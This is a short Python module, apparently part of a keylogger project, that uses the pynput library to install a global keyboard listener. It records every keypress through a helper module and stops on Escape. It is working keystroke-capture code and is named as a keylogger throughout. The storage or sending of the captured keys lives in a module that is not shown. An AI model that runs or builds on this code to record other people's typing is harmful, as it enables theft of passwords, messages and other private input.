from pynput import keyboard
import utils

def on_press(key):
    try:
        utils.add_key(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            utils.add_key(" ")
        elif key == keyboard.Key.enter:
            utils.add_key("\n")
        else:
            utils.add_key(" " + str(key) + " ")

def on_release(key):
    if key == keyboard.Key.esc:
        utils.set_keylogger_finished()

def start_keylogger():
    # Start keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
